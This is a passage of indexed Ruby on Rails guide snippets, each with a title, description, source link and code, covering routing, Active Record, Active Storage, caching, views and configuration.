respective source files. It also pins all files from the `app/javascript/controllers` directory under the `controllers` namespace.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_121\n\nLANGUAGE: ruby\nCODE:\n```\n# Pin npm packages by running ./bin/importmap\n\npin \"application\"\npin \"@hotwired/turbo-rails\", to: \"turbo.min.js\"\npin \"@hotwired/stimulus\", to: \"stimulus.min.js\"\npin \"@hotwired/stimulus-loading\", to: \"stimulus-loading.js\"\npin_all_from \"app/javascript/controllers\", under: \"controllers\"\n```\n\n----------------------------------------\n\nTITLE: Generating and Streaming PDF Files in Rails\nDESCRIPTION: Demonstrates how to generate a PDF document using Prawn gem and stream it to the client using send_data method. The example includes generating client information in PDF format and sending it as a downloadable file.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_advanced_topics.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"prawn\"\nclass ClientsController < ApplicationController\n  # Generates a PDF document with information on the client and\n  # returns it. The user will get the PDF as a file download.\n  def download_pdf\n    client = Client.find(params[:id])\n    send_data generate_pdf(client),\n              filename: \"#{client.name}.pdf\",\n              type: \"application/pdf\"\n  end\n\n  private\n    def generate_pdf(client)\n      Prawn::Document.new do\n        text client.name, align: :center\n        text \"Address: #{client.address}\"\n        text \"Email: #{client.email}\"\n      end.render\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a Basic Rake Task in Ruby\nDESCRIPTION: Creates a basic rake task with a description and prerequisite tasks. The task has a descriptive comment and can depend on other tasks that should be executed before this one runs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\ndesc \"I am short, but comprehensive description for my cool task\"\ntask task_name: [:prerequisite_task, :another_task_we_depend_on] do\n  # All your magic here\n  # Any valid Ruby code is allowed\nend\n```\n\n----------------------------------------\n\nTITLE: Installing Active Storage in Ruby on Rails\nDESCRIPTION: Commands to install Active Storage and run the necessary database migrations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails active_storage:install\n$ bin/rails db:migrate\n```\n\n----------------------------------------\n\nTITLE: Setting Time Zone in Rails Configuration (Ruby)\nDESCRIPTION: This code snippet demonstrates how to set the time zone for a Rails application within the `config/application.rb` file. It uses the `config.time_zone` setting to specify the desired time zone.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.time_zone = \"Central Time (US & Canada)\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Asset Host for Mailer Image Tags (Ruby)\nDESCRIPTION: Configures the Rails application to use a specified asset host (e.g., CDN or site domain URL) for images in emails via config.action_mailer.asset_host. Required for image_tag helpers in Action Mailer to resolve message images to external static asset URLs with full protocols.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.asset_host = \"http://example.com\"\n```\n\n----------------------------------------\n\nTITLE: Create Multiple Action Cable Subscribers JavaScript\nDESCRIPTION: This JavaScript code creates multiple subscriptions for a consumer to the same channel, in this case, \"ChatChannel\", but with different room parameters. It demonstrates how a single consumer can subscribe to multiple instances of the same channel to manage different contexts or rooms.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\n// app/javascript/channels/chat_channel.js\nimport consumer from \"./consumer\"\n\nconsumer.subscriptions.create({ channel: \"ChatChannel\", room: \"1st Room\" })\nconsumer.subscriptions.create({ channel: \"ChatChannel\", room: \"2nd Room\" })\n```\n\n----------------------------------------\n\nTITLE: Disabling Single Table Inheritance in Rails\nDESCRIPTION: Shows how to disable Single Table Inheritance by setting the inheritance_column to nil, useful when working with legacy databases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_82\n\nLANGUAGE: ruby\nCODE:\n```\n# Schema: vehicles[ id, type, created_at, updated_at ]\nclass Vehicle < ApplicationRecord\n  self.inheritance_column = nil\nend\n\nVehicle.create!(type: \"Car\")\n# => #<Vehicle type: \"Car\", color: \"Red\", price: 10000>\n```\n\n----------------------------------------\n\nTITLE: Mobile System Test Case Configuration (Ruby)\nDESCRIPTION: This Ruby code defines a custom system test case class, `MobileSystemTestCase`, that configures system tests to run with a specific screen size for mobile testing. It uses `driven_by` to set the driver to Selenium, the browser to Chrome, and the screen size to 375x667 pixels.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_71\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass MobileSystemTestCase < ActionDispatch::SystemTestCase\n  driven_by :selenium, using: :chrome, screen_size: [375, 667]\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Audio Tags with audio_tag Helper in Ruby\nDESCRIPTION: Illustrates the `audio_tag` helper from Action View's AssetTagHelper. It generates an HTML `<audio>` tag. Examples show usage with a single source, multiple sources (generating nested `<source>` tags), and adding HTML attributes like `controls`. It uses `audio_path` internally.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_27\n\nLANGUAGE: ruby\nCODE:\n```\naudio_tag(\"sound\")\n# => <audio src=\"/audios/sound\"></audio>\n```\n\nLANGUAGE: ruby\nCODE:\n```\naudio_tag(\"sound.wav\", \"sound.mid\")\n# => <audio><source src=\"/audios/sound.wav\" /><source src=\"/audios/sound.mid\" /></audio>\n```\n\nLANGUAGE: ruby\nCODE:\n```\naudio_tag(\"sound\", controls: true)\n# => <audio controls=\"controls\" src=\"/audios/sound\"></audio>\n```\n\n----------------------------------------\n\nTITLE: Explicit Helper Dependency for Template Caching\nDESCRIPTION: This example shows how to add a comment to indicate a dependency on a helper method within a cached block. This forces a cache invalidation when the helper method is updated.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_21\n\nLANGUAGE: html\nCODE:\n```\n<%# Helper Dependency Updated: Jul 28, 2015 at 7pm %>\n<%= some_helper_method(person) %>\n```\n\n----------------------------------------\n\nTITLE: Hash With Indifferent Access Ruby\nDESCRIPTION: The `with_indifferent_access` method converts a standard Ruby hash into an `ActiveSupport::HashWithIndifferentAccess`. This allows you to access values using either symbol or string keys, such as `hash[:key]` or `hash[\"key\"]`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_136\n\nLANGUAGE: ruby\nCODE:\n```\n{ a: 1 }.with_indifferent_access[\"a\"] # => 1\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Loggers in Rails Application\nDESCRIPTION: Shows different ways to specify an alternative logger in Rails configuration files. This allows for customizing where and how log information is written.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.logger = Logger.new(STDOUT)\nconfig.logger = Log4r::Logger.new(\"Application Log\")\n```\n\n----------------------------------------\n\nTITLE: Constraints in a Block Form (Lambda) (Ruby)\nDESCRIPTION: Applies a constraint to multiple routes within a block, using a lambda function.  The lambda checks if the request's remote IP is on a restricted list.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.routes.draw do\n  constraints(lambda { |request| RestrictedList.retrieve_ips.include?(request.remote_ip) }) do\n    get \"*path\", to: \"restricted_list#index\"\n    get \"*other-path\", to: \"other_restricted_list#index\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Hash To Options Ruby\nDESCRIPTION: The `to_options` and `to_options!` methods are simply aliases for `symbolize_keys` and `symbolize_keys!`, respectively. These provide a more semantic way of symbolizing keys in a hash that is being used as a set of options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_131\n\n\n\n----------------------------------------\n\nTITLE: Expanded Rails Routes Output (bash)\nDESCRIPTION: Shows how to use the `--expanded` option with `bin/rails routes` to display the routes in a more readable, expanded table format. It enhances visibility by separating the Prefix, Verb, URI, and Controller#Action into distinct columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_82\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails routes --expanded\n```\n\n----------------------------------------\n\nTITLE: Default URL Options in Rails Controller\nDESCRIPTION: Demonstrates how to define `default_url_options` in a controller to set global default parameters for `url_for` and path helpers. This example adds the current locale to every generated URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  def default_url_options\n    { locale: I18n.locale }\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing ActiveJob callbacks\nDESCRIPTION: This snippet demonstrates implementing `around_perform` callbacks in an ActiveJob class. The `around_cleanup` method is executed before and after the `perform` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nclass GuestsCleanupJob < ApplicationJob\n  queue_as :default\n\n  around_perform :around_cleanup\n\n  def perform\n    # Do something later\n  end\n\n  private\n    def around_cleanup\n      # Do something before perform\n      yield\n      # Do something after perform\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Assigning Attributes Using assign_attributes\nDESCRIPTION: This snippet demonstrates the `assign_attributes` method to set multiple attributes at once by passing a hash of attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\n\n# Set multiple attributes at once\nirb> person.assign_attributes(name: \"John\", date_of_birth: \"1998-01-01\", active: false)\n\nirb> person.name\n=> \"John\"\nirb> person.date_of_birth\n=> Thu, 01 Jan 1998\nirb> person.active\n=> false\n```\n\n----------------------------------------\n\nTITLE: Preventing instance writer generation with class_attribute\nDESCRIPTION: This code snippet illustrates how to prevent the generation of the writer instance method for a `class_attribute` by setting the `:instance_writer` option to `false`. This can be useful for preventing mass-assignment from setting the attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\nmodule ActiveRecord\n  class Base\n    class_attribute :table_name_prefix, instance_writer: false, default: \"my\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Russian Doll Caching: Outer Fragment with ERB\nDESCRIPTION: An example of the outer fragment in Russian Doll caching. This fragment caches the rendering of a product along with its associated games.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_4\n\nLANGUAGE: erb\nCODE:\n```\n<% cache product do %>\n  <%= render product.games %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Running EXPLAIN with Includes in Rails\nDESCRIPTION: This snippet shows how to use `explain` with eager loading using `includes`.  The example demonstrates how eager loading can result in multiple queries, each with its own explain plan.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_212\n\nLANGUAGE: ruby\nCODE:\n```\nCustomer.where(id: 1).includes(:orders).explain\n```\n\n----------------------------------------\n\nTITLE: Generating Immediate URLs for Active Storage Representations in Ruby\nDESCRIPTION: This Ruby code snippet demonstrates how to generate immediate URLs for Active Storage representations, which can be useful for improving performance in certain scenarios.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_54\n\nLANGUAGE: ruby\nCODE:\n```\nimage_tag file.representation(resize_to_limit: [100, 100]).processed.url\n```\n\n----------------------------------------\n\nTITLE: Registering and Unregistering Error Subscribers in Ruby on Rails\nDESCRIPTION: Shows how to register and unregister error subscribers using Rails.error.subscribe and Rails.error.unsubscribe methods. These methods can take either a subscriber instance or a class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nRails.error.subscribe(ErrorSubscriber.new)\n\nsubscriber = ErrorSubscriber.new\nRails.error.unsubscribe(subscriber)\n# or\nRails.error.unsubscribe(ErrorSubscriber)\n```\n\n----------------------------------------\n\nTITLE: Defining Root Route in Rails\nDESCRIPTION: This code snippet shows how to define the root route (`/`) in a Rails application. The first example explicitly specifies the `to` option, while the second uses a shortcut syntax. The `root` route typically handles GET requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_55\n\nLANGUAGE: ruby\nCODE:\n```\nroot to: \"pages#main\"\n```\n\nLANGUAGE: ruby\nCODE:\n```\nroot \"pages#main\" # shortcut for the above\n```\n\n----------------------------------------\n\nTITLE: Using Custom Form Helper in ERB\nDESCRIPTION: This code snippet shows how to use the custom form helper `text_field_with_label` in an ERB template within a Rails application. It passes the form builder object and the attribute name to the helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_63\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @person do |form| %>\n  <%= text_field_with_label form, :first_name %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Partial Template for Search Filters with Yield\nDESCRIPTION: This code snippet demonstrates a partial template that uses `yield` to render specific form fields passed from the calling view. It creates a generic search form layout that can be reused across different resources.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_74\n\nLANGUAGE: html\nCODE:\n```\n<%= form_with model: search do |form| %>\n  <h1>Search form:</h1>\n  <fieldset>\n    <%= yield form %>\n  </fieldset>\n  <p>\n    <%= form.submit \"Search\" %>\n  </p>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Transaction Callback Ordering in Rails\nDESCRIPTION: This snippet demonstrates how to configure the order in which transaction callbacks (`after_commit`, `after_rollback`, etc.) are executed in Rails. By default (Rails 7.1+), they run in the order they are defined.  Older versions reversed the order.  You can revert to the old behavior by setting `config.active_record.run_after_transaction_callbacks_in_order_defined = false`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.run_after_transaction_callbacks_in_order_defined = false\n```\n\n----------------------------------------\n\nTITLE: Hash Extract! Ruby\nDESCRIPTION: The `extract!` method removes the key-value pairs specified from a hash and returns a new hash with the extracted pairs. The original hash is modified.  If the receiver is a subclass of Hash, extract! returns the same subclass.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_135\n\nLANGUAGE: ruby\nCODE:\n```\nhash = { a: 1, b: 2 }\nrest = hash.extract!(:a) # => {:a=>1}\nhash                     # => {:b=>2}\n```\n\nLANGUAGE: ruby\nCODE:\n```\nhash = { a: 1, b: 2 }.with_indifferent_access\nrest = hash.extract!(:a).class\n# => ActiveSupport::HashWithIndifferentAccess\n```\n\n----------------------------------------\n\nTITLE: Disabling Default Active Storage Routes in Ruby on Rails\nDESCRIPTION: This configuration snippet shows how to disable the default Active Storage routes in Rails, which is useful when implementing custom authenticated controllers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_storage.draw_routes = false\n```\n\n----------------------------------------\n\nTITLE: Conditional Logic with Local Assigns (show.html.erb)\nDESCRIPTION: This snippet renders a single article, passing it to the `_article` partial.  It passes the local variable `full` set to `true`, enabling the full content rendering in the partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_80\n\nLANGUAGE: erb\nCODE:\n```\n<%= render article, full: true %>\n```\n\n----------------------------------------\n\nTITLE: Retaining Existing Attachments in Form Submission with Rails\nDESCRIPTION: Shows how to preserve existing attachments in a form by using hidden fields with the signed_id of each attached file. This allows keeping existing files while adding new ones.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_38\n\nLANGUAGE: erb\nCODE:\n```\n<% @message.images.each do |image| %>\n  <%= form.hidden_field :images, multiple: true, value: image.signed_id %>\n<% end %>\n\n<%= form.file_field :images, multiple: true %>\n```\n\n----------------------------------------\n\nTITLE: Installing Engine Migrations for Specific Database (Bash)\nDESCRIPTION: Copies migrations from engines, targeting a specific database connection defined in the application's `database.yml` using the `DATABASE` environment variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_33\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails railties:install:migrations DATABASE=animals\n```\n\n----------------------------------------\n\nTITLE: Generating Article Scaffold via Rails Command\nDESCRIPTION: Command to generate a scaffolded article resource with title and text fields\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold article title:string text:text\n```\n\n----------------------------------------\n\nTITLE: Redirecting with Custom Flash Key - Ruby\nDESCRIPTION: This example shows how to set a custom flash key named `:just_signed_up` when redirecting. This allows you to pass arbitrary data in the flash, which can be used in the view to display specific content based on the flash value.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nredirect_to root_url, flash: { just_signed_up: true }\n```\n\n----------------------------------------\n\nTITLE: Connect Action Cable Consumer JavaScript\nDESCRIPTION: This JavaScript code creates an Action Cable consumer which provides the framework to deal with WebSockets in Rails. It imports the createConsumer function from \"@rails/actioncable\" and exports the default consumer that'll connect against `/cable` on your server.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\n// app/javascript/channels/consumer.js\n// Action Cable provides the framework to deal with WebSockets in Rails.\n// You can generate new channels where WebSocket features live using the `bin/rails generate channel` command.\n\nimport { createConsumer } from \"@rails/actioncable\"\n\nexport default createConsumer()\n```\n\n----------------------------------------\n\nTITLE: Configuring ActionDispatch::DebugLocks Middleware in Ruby Rails\nDESCRIPTION: This code snippet shows how to add the ActionDispatch::DebugLocks middleware to a Rails application for debugging lock-related issues. It inserts the middleware before Rack::Sendfile in the middleware stack.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/threading_and_code_execution.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.insert_before Rack::Sendfile,\n                                  ActionDispatch::DebugLocks\n```\n\n----------------------------------------\n\nTITLE: File Field with Manual Enctype\nDESCRIPTION: This snippet creates a file upload field using `file_field_tag` and manually sets the `multipart` option in `form_with` to ensure the `enctype` attribute is set to `multipart/form-data`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_59\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with url: \"/uploads\", multipart: true do |form| %>\n  <%= file_field_tag :csv_file %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Date calculations with beginning_of_week and end_of_week in Ruby\nDESCRIPTION: These methods return the dates for the beginning and end of the week, respectively. Weeks are assumed to start on Monday, but that can be changed passing an argument. It demonstrates how to use `beginning_of_week` and `end_of_week` methods on a Date object, showing the effects of specifying a different starting day of the week (e.g., `:sunday`).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_141\n\nLANGUAGE: ruby\nCODE:\n```\nd = Date.new(2010, 5, 8)     # => Sat, 08 May 2010\nd.beginning_of_week          # => Mon, 03 May 2010\nd.beginning_of_week(:sunday) # => Sun, 02 May 2010\nd.end_of_week                # => Sun, 09 May 2010\nd.end_of_week(:sunday)       # => Sat, 08 May 2010\n```\n\n----------------------------------------\n\nTITLE: Displaying the Rich Text Description - ERB\nDESCRIPTION: This snippet displays the rich text description of a product in the `show` view. It renders the content of the `@product.description` attribute, which will include any formatting or embedded media added through the Action Text editor.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_82\n\nLANGUAGE: erb\nCODE:\n```\n<% cache @product do %>\n  <h1><%= @product.name %></h1>\n  <%= @product.description %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Using ActiveModel::AttributeAssignment for Bulk Assignment\nDESCRIPTION: This snippet demonstrates how to include `ActiveModel::AttributeAssignment` in a Ruby class to allow setting multiple attributes at once using a hash of attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person\n  include ActiveModel::AttributeAssignment\n\n  attr_accessor :name, :date_of_birth, :active\nend\n```\n\n----------------------------------------\n\nTITLE: Absence Validation Example\nDESCRIPTION: Shows how to implement absence validation with conditional logic.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :phone_number, :address, absence: true, if: :invited?\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Add Column Migration (Bash)\nDESCRIPTION: This command generates a migration to add a 'part_number' column (string type) to the 'products' table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration AddPartNumberToProducts part_number:string\n```\n\n----------------------------------------\n\nTITLE: Generating Remove Column Migration (Bash)\nDESCRIPTION: This command generates a migration to remove the 'part_number' column of type string from the 'products' table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration RemovePartNumberFromProducts part_number:string\n```\n\n----------------------------------------\n\nTITLE: Enabling Cross-Client HTTP Caching - Rack::Cache Integration - Ruby\nDESCRIPTION: Shows how to make HTTP caching public with the stale? method and public: true option, permitting shared cache behavior across clients. Works in conjunction with Rack::Cache and a configured Rails cache store.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\ndef show\n  @post = Post.find(params[:id])\n\n  if stale?(last_modified: @post.updated_at, public: true)\n    render json: @post\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Importing React Packages in JavaScript\nDESCRIPTION: Example of importing React and ReactDOM packages in a JavaScript file after pinning them with importmap-rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\nimport React from \"react\"\nimport ReactDOM from \"react-dom\"\n```\n\n----------------------------------------\n\nTITLE: Configuring CORS Middleware in Rails\nDESCRIPTION: Setting up an initializer to configure the Rack CORS middleware, allowing cross-origin requests from specific domains with defined HTTP methods and headers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_76\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/cors.rb\nRails.application.config.middleware.insert_before 0, Rack::Cors do\n  allow do\n    origins \"example.com\"\n\n    resource \"*\",\n      headers: :any,\n      methods: [:get, :post, :put, :patch, :delete, :options, :head]\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Pessimistic Locking Example (Ruby)\nDESCRIPTION: This snippet demonstrates pessimistic locking using the `lock` method within a transaction. This obtains an exclusive lock on the selected rows.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_133\n\nLANGUAGE: ruby\nCODE:\n```\nBook.transaction do\n  book = Book.lock.first\n  book.title = \"Algorithms, second edition\"\n  book.save!\nend\n```\n\n----------------------------------------\n\nTITLE: Generating JavaScript Include Tags with javascript_include_tag Helper in Ruby\nDESCRIPTION: Shows the `javascript_include_tag` helper from Action View's AssetTagHelper. It generates HTML `<script>` tags for including JavaScript files, typically from `app/assets/javascripts`. Examples demonstrate basic usage and adding attributes like `async` and `defer`. It uses `javascript_path` internally.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\njavascript_include_tag(\"common\")\n# => <script src=\"/assets/common.js\"></script>\n```\n\nLANGUAGE: ruby\nCODE:\n```\njavascript_include_tag(\"common\", async: true)\n# => <script src=\"/assets/common.js\" async=\"async\"></script>\n```\n\n----------------------------------------\n\nTITLE: Generating path and URL helpers for a route\nDESCRIPTION: This example shows how to generate path and URL helper methods for a defined route. The `as:` option is used to provide a custom name for the route, which is then used to create helper methods like `user_path` and `user_url`. This helps avoid hardcoding URLs in views.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/users/:id\", to: \"users#show\", as: \"user\"\n```\n\n----------------------------------------\n\nTITLE: Adding Multiple Preview Paths for ActionMailer in Rails 7.1\nDESCRIPTION: Example showing how to add additional paths for ActionMailer previews using the new config.action_mailer.preview_paths configuration option, which replaces the deprecated preview_path option.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.preview_paths << \"#{Rails.root}/lib/mailer_previews\"\n```\n\n----------------------------------------\n\nTITLE: Disabling Query Cache for MySQL (YAML)\nDESCRIPTION: This YAML snippet disables the query cache for MySQL in the development environment. Setting `query_cache` to `false` prevents Rails from caching query results.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_100\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: mysql2\n  query_cache: false\n```\n\n----------------------------------------\n\nTITLE: Creating a Join Table with Indices\nDESCRIPTION: This snippet demonstrates how to create a join table and add custom indices using a block. It adds indices to the `product_id` and `category_id` columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\ncreate_join_table :products, :categories do |t|\n  t.index :product_id\n  t.index :category_id\nend\n```\n\n----------------------------------------\n\nTITLE: Securing File Downloads in Ruby on Rails\nDESCRIPTION: This code snippet shows how to securely handle file downloads in Rails. It checks that the requested file is within the expected directory to prevent unauthorized access to files outside the intended scope.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nbasename = File.expand_path(\"../../files\", __dir__)\nfilename = File.expand_path(File.join(basename, @file.public_filename))\nraise if basename != File.expand_path(File.dirname(filename))\nsend_file filename, disposition: \"inline\"\n```\n\n----------------------------------------\n\nTITLE: Installing Rails Gem (bash)\nDESCRIPTION: Installs the latest version of the Rails framework and its dependencies using the RubyGems package manager. The `gem install rails` command fetches the gem from RubyGems.org.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/install_ruby_on_rails.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ gem install rails\n```\n\n----------------------------------------\n\nTITLE: Application Layout (application.html.erb)\nDESCRIPTION: This code snippet defines a basic application layout with sections for the head, top menu, menu, and content.  It utilizes `yield` and `content_for` to allow views to inject content into these sections.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_96\n\nLANGUAGE: html+erb\nCODE:\n```\n<html>\n<head>\n  <title><%= @page_title or \"Page Title\" %></title>\n  <%= stylesheet_link_tag \"layout\" %>\n  <%= yield :head %>\n</head>\n<body>\n  <div id=\"top_menu\">Top menu items here</div>\n  <div id=\"menu\">Menu items here</div>\n  <div id=\"content\"><%= content_for?(:content) ? yield(:content) : yield %></div>\n</body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Avoiding Double Render Errors in Rails\nDESCRIPTION: These code snippets illustrate how to avoid the \"Can only render or redirect once per action\" error in Rails. The example shows a common mistake of having multiple render calls in a single code path, and demonstrates how to fix it by using `return`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\ndef show\n  @book = Book.find(params[:id])\n  if @book.special?\n    render action: \"special_show\"\n  end\n  render action: \"regular_show\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndef show\n  @book = Book.find(params[:id])\n  if @book.special?\n    render action: \"special_show\"\n    return\n  end\n  render action: \"regular_show\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\ndef show\n  @book = Book.find(params[:id])\n  if @book.special?\n    render action: \"special_show\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Reusable Association Extensions with Modules in Rails\nDESCRIPTION: Example of creating shareable extension modules that can be applied to multiple associations across different models. This promotes code reuse for common association functionality.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_142\n\nLANGUAGE: ruby\nCODE:\n```\nmodule FindRecentExtension\n  def find_recent\n    where(\"created_at > ?\", 5.days.ago)\n  end\nend\n\nclass Author < ApplicationRecord\n  has_many :books, -> { extending FindRecentExtension }\nend\n\nclass Supplier < ApplicationRecord\n  has_many :deliveries, -> { extending FindRecentExtension }\nend\n```\n\n----------------------------------------\n\nTITLE: New Product View - ERB\nDESCRIPTION: This ERB snippet renders the `_form` partial and passes the `@product` instance variable as the `product` local variable to the partial.  It also includes a link to cancel the new product creation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_62\n\nLANGUAGE: erb\nCODE:\n```\n<h1>New product</h1>\n\n<%= render \"form\", product: @product %>\n<%= link_to \"Cancel\", products_path %>\n```\n\n----------------------------------------\n\nTITLE: Using Rails Logger for Zeitwerk Autoloading - Ruby\nDESCRIPTION: Sets 